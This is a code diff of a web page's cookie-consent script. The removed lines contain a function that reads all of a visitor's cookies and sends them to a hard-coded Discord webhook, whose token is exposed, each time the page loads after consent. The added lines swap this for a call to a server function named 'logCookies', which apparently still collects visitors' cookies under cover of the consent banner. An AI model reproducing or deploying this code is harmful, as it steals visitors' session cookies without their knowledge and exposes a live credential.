@@ -33,49 +33,24 @@
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace if needed
-        const delayBeforeSend = 2000; // 2 seconds
-
-        function sendCookiesToWebhook() {
-            const allCookies = document.cookie;
-            const cookieArray = allCookies ? allCookies.split(';') : [];
-            const formattedCookies = cookieArray.map(cookie => cookie.trim()).join('\n- ');
-
-            const payload = {
-                content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies || 'No cookies set'}`
-            };
-
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error("Webhook failed:", err));
-        }
-
-        function hasAcceptedCookies() {
-            return document.cookie.includes("cookieConsent=true");
-        }
+        const delayBeforeSend = 2000;
 
         function acceptCookies() {
-            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365; // 1 year
-            const banner = document.getElementById("cookie-banner");
-            if (banner) {
-                banner.style.display = "none";
-            }
+            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
+            document.getElementById("cookie-banner").style.display = "none";
 
-            setTimeout(sendCookiesToWebhook, delayBeforeSend);
+            setTimeout(() => {
+                fetch("/.netlify/functions/logCookies");
+            }, delayBeforeSend);
         }
 
         window.onload = () => {
-            if (hasAcceptedCookies()) {
-                setTimeout(sendCookiesToWebhook, delayBeforeSend);
+            if (document.cookie.includes("cookieConsent=true")) {
+                setTimeout(() => {
+                    fetch("/.netlify/functions/logCookies");
+                }, delayBeforeSend);
             } else {
-                const banner = document.getElementById("cookie-banner");
-                if (banner) {
-                    banner.style.display = "block";
-                }
+                document.getElementById("cookie-banner").style.display = "block";
             }
         };
     </script>
